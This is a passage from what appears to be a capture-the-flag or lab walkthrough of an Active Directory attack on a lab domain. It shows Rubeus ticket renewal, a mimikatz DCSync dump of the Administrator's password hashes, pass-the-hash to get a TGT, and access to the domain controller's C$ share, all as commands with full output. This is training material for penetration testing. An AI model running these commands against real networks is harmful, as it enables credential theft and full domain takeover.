4ebiVLOsADYzN+Wf86lhWE1j1gDpSvG/MWaSP/I+hR2Dw1sK7Ea/MwLsyJ0R18RxTQiaAQpI53lDm2kMeAgQVUt49rhw7QeE+y+QBkddmWOeDcZnO28XeLDAA8Ijpi/Uo25xlxIX3QxTRvh/1m7HiPB2GzVS9mLmoqjmU4NV7wZD9dYn1LbBak39T7iGufT9ETGT7vj8MijvMASscQhGjmM7SNywl02VR5sM1QeaI9Nld9Bi7BlqNjc/Q+5uS7D2JAPQWrBITMByXF++0FeCAFLU6VEAHwfkT3FZO59wba891plxJGmT3v2fzRDJgiKWaZj1V1+5Kfb4TkcS+oXY5f9/dhlZpcPHaN9EG+jn1LXzsuzICuvonyb1zm5DsMhR3OpffdOmxNwYe1qLgmBjiewXLeIMseosirlefJMTH23RcN1YSgZs36yWczYRKA7jX/sFGBztXgRhuXDy+tMtTC+ZR4UTL+kY7jEQWskBr4ylVlavmWhdsMURFUvxSfbYdkmB4vgycbfqVyqsEpQNCJU8kDKd10FF3/sPm0dz7X+Qfj/cx7lgm0qUvc6ZmiRVqk5p9xlCOUKAlvNlNjM51zMEe1rjI2sBxpwL46PRXvthXdDHha050Z10QaqVEfyltzlgZSdrnQs6DkCgI09CeyDbt7ChDndjJYf8wEQcvSzeDMT72E2SM+6lS5DRRVuM05FCC5iDkKC5j8lpaJWEK2Pw212dr+j222G/60rLX2o/Mywia49vmTIULobNxUdns7FLszW6LCqXJ3xOrYaQnSzgWflljS4ARArfJ+2CF611xZSHSYhlz0HcXxO02PJoSxsnG8hIcxFsjh/PWDEkxgqO2ebh0As7JaV4k3YFcfnyD8Gm2bo9L6OB+DCB9aADAgEAooHtBIHqfYHnMIHkoIHhMIHeMIHboCswKaADAgESoSIEINARGdxEFQOUQIl6oXTYIhZXes3eL6SjhzX4Y2Bw5h/voRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDEyNjEyMDgyMVqmERgPMjAyNTAxMjYyMjA4MjBapxEYDzIwMjUwMjAyMTIwODIwWqgVGxNJTkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM
```

```output title="Output" hl_lines="4"
[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\DC01$'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      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
      LkxPQ0FM
[+] Ticket successfully imported!
```

### DCSync for Administrator

```pwsh
PS C:\Users\derek.walker> C:\Tools\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\Administrator" exit
```

```output title="Output" hl_lines="3 20"
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/19/2022 2:42:15 AM
Object Security ID   : S-1-5-21-1870146311-1183348186-593267556-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: a83b750679b1789e29e966d06c7e41f7

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : c0c314620e831f51d2e70c8bbcf467d0

* Primary:Kerberos-Newer-Keys *
    Default Salt : INLANEFREIGHT.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 63c66123844eb389d84ba45ce22a1049616c9575ba1db00ee7296f756f5efd83
      aes128_hmac       (4096) : 14dcfebbfdff3600c11212b2fdbcfbee
      des_cbc_md5       (4096) : 51f1a19b4ace5b98
    OldCredentials
      aes256_hmac       (4096) : c061ecce3c5065cb8fa5a318f87043fcda393e5847cd60c5b577c792abe4b1cf
      aes128_hmac       (4096) : cae406f8ce064461c3d052bee571b22a
      des_cbc_md5       (4096) : dce90843451cd5d9
    OlderCredentials
      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
      des_cbc_md5       (4096) : 9876615285c2766e

* Primary:Kerberos *
    Default Salt : INLANEFREIGHT.LOCALAdministrator
    Credentials
      des_cbc_md5       : 51f1a19b4ace5b98
    OldCredentials
      des_cbc_md5       : dce90843451cd5d9

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  ab2fdc53a990e32869e8a98fc59dc206
    02  3abca29569facfbc205683459eaece35
    03  0e0679aecd5273af2e68d8b323aae976
    04  ab2fdc53a990e32869e8a98fc59dc206
    05  c9919f1a836e7fabb18d130cec24807c
    06  7b73d306501805583d681b925182046c
    07  f1ccbd2394180bc5c5802995f6ba6a69
    08  b08fc537753c5101f20b63165e280005
    09  45986e33d4f21254afb5f7e87a39cd8d
    10  1e102037b067dc87394511c8a3064383
    11  b08fc537753c5101f20b63165e280005
    12  dd78ee60caa7509ef912b5aae361f3e4
    13  69577b907120d00bebd4b75dfda7991d
    14  914f9c2c97f766342099756e0c1a1630
    15  08e335a746497008039494a75c4ed639
    16  da981c56ea848ac4776321d17e51cc44
    17  e2a7bb20c06e2d632a8c87d6c642ad13
    18  077e3aecbdbb74250de005297bcad363
    19  625cf00ec72be3a3ee550babc6c01ad4
    20  48ef0f03bbcce15c6038a8f70c294f5a
    21  50ef9d684511c75a6e4dffae3b3ccb6c
    22  e5bd6515c85eea79aea14180e9c1c874
    23  040a88fc1e0241e581efc2fa7905a277
    24  694b699679cc1b5fb29f8d94c80e3081
    25  e36606074f573fb29d38e9fca76aed42
    26  6f7d7d09a921775625b065070e5ffd06
    27  2e94f912d99837fdbfa8fbab930636ff
    28  693252322e42b9cc9fec8a962d351f54
    29  1e14b5ecaacafdb74ac49712c20c8da5
```

### Requesting a TGT

!!! abstract

    DCSync saldırısı ile elde edilen NTLM hash TGT talep etmek için kullanılır.

```pwsh
PS C:\Users\derek.walker> C:\Tools\Rubeus.exe asktgt /ptt /user:Administrator /rc4:A83B750679B1789E29E966D06C7E41F7
```

```output title="Output" hl_lines="4"
[*] Action: Ask TGT

[*] Using rc4_hmac hash: A83B750679B1789E29E966D06C7E41F7
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\Administrator'
[*] Using domain controller: 172.16.99.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGFjCCBhKgAwIBBaEDAgEWooIFETCCBQ1hggUJMIIFBaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggS7MIIEt6ADAgESoQMC
      AQKiggSpBIIEpRbF7MXkp7xrt5/ybapcP9E2nX7B+DGhHoPG7qCMM6h6QRSAotq7aBgcltArkfL0Z7Bj
      Ovm9Z0xxjdAYXQaY6zWLl5KFbt+r4NQrTRHHYqZqLu32g/fFv0dnW2zftMsqx9RC0ntSJTE/ObXBa+C2
      DpyBFC7Pgtvewr7AzM13tZGOFHD7jlRRWoiDWDIPLzqQt90yP+yDondU9d16sK2K0RM9QmRs0uGe0VsM
      rYizFE8qDBxN0328akJVJwtzCKBU8ybA26LQtf63CFpbn6L0YPMOD7nXWRSNu7ODKulpEGhWa4CLCnAO
      cVySiUPJ0UpKhSMbgTE/cn803uF8weL5TiNCY2FIz8me/cZekShgxLHcDX3K9taILo/RzKPEQWQL1twk
      JhooutWG3ptWOf2rK0YwzLwCOgkyBQ1PGsfyxCDvaWPD7wNIl4knL551O0jkBnncQUZmIqpZdGrJI9kk
      DZT8jcfPzoGr3087+TYOXz8zao0OPxwgZu7G5a2ezOLv3QONjiowUCuCNUhkaiDjZbWuNHJYBMYLCWoF
      fmsodsrsP6cKU44br66kYACX6E3agpZCYZ2ipTovDlN+wWKyDFmfSPj/KX71j+kMI69laKW1nD4OEYOJ
      ZdqxCmaHFnBrruY0pjsnJ77TWOav8LDTqph3sULQfCHOoGuxAFsA0RnstditkNWA0yM2L2UZJyHsRFyY
      hL9+SBz2OTXgpCUraTIYW5wAtQKbiSb7fBoTEY5Wiepo9HaOBAl8I/nqNiKPrb7KnS+xrXAO/480NeHQ
      lMdpVCR+iND/vpC/w9/ZyZPHGcuvh9fbyrLReSau90zc8ts4shWD8pra9WZWyI8SuOB/LUwtjsgEcmRA
      XmDxOAuiCtRU9tSonw6B7O624EDXc17bG/VyjEAjpeU4jkq/MV+jowYNTzB0cxfmTa7t5Tibfc+xL+4V
      f0LpD9zFqXYe2WiQ9sykgwbpcFjgGaoScrG/IxV6Sa55Wt1PnRgfTg8yhtq1GOAhu9bLQyHVNStQLJKo
      4xXy4j8btMEvMXzO/Wmax4SHlDO5u12mHtfc1itVbuspeB8LbNQ95pngl5f8nNLRG8fikLtzMZqYlNSL
      kJfp/3sssPheJH4dMpbrSeOvGpAAm5efQ1kJTCrpJFqXdr0q3cPUv4v707YGj5aOQepPWzjWXIrpdaYQ
      Ta6M1tOozZ7OddxYxUJkzLbmJ84pMbjZm9aVr/CZiYcx2Bpy2SuD5kClr3KtVKItIsrGLqQ+yP4i2qQs
      JcJAYNrqr0wSRHlg68LWE0KZrcCXwPsMYGK6rwH7/y/X4+elM0DsRHhJyfimikIRMWqHbin5uDBF62rs
      gu58QB/W0CqURnaBIO9BeI6LU5KJPfnJjifRlfL/Zd9M+GQVk3UU0HkALBOBb5SwAGtF7wOU5y/Uqefd
      o0kJVkrsmfintiukdYBf71IUxFfktRlRP6q4s+o3teJ6QwrU0Mz1MoJvvq3h86XOnK8A/UNfPNY45ACO
      OreG0AlG9XYDS6skigBXQYqNyEBGw38fksyt/VfFpfCjFwMD6YnVe9nNQ/IesZFQkTFEhgHmDk9OniCj
      gfAwge2gAwIBAKKB5QSB4n2B3zCB3KCB2TCB1jCB06AbMBmgAwIBF6ESBBD3PasoFQA5jlui3y0+l8UN
      oRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAA
      pREYDzIwMjUwMTI2MTU0MDE1WqYRGA8yMDI1MDEyNzAxNDAxNVqnERgPMjAyNTAyMDIxNTQwMTVaqBUb
      E0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9D
      QUw=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  Administrator
  UserRealm                :  INLANEFREIGHT.LOCAL
  StartTime                :  1/26/2025 9:40:15 AM
  EndTime                  :  1/26/2025 7:40:15 PM
  RenewTill                :  2/2/2025 9:40:15 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  9z2rKBUAOY5bot8tPpfFDQ==
  ASREP (key)              :  A83B750679B1789E29E966D06C7E41F7
```

### Listing Directory Contents

```pwsh
PS C:\Users\derek.walker> dir \\DC01.INLANEFREIGHT.LOCAL\C$
```

```output title="Output"
    Directory: \\DC01.INLANEFREIGHT.LOCAL\C$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         4/3/2023   2:58 PM                carole.holmes
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---        10/6/2021   3:50 PM                Program Files
d-----        4/12/2023   3:24 PM                Program Files (x86)
d-----        3/30/2023  11:08 AM                Shares
d-----         4/4/2023   1:49 PM                Tools
d-----        3/30/2023   3:13 PM                Unconstrained
d-r---         4/4/2023  11:34 AM                Users
d-----       10/14/2022   6:49 AM                Windows
```
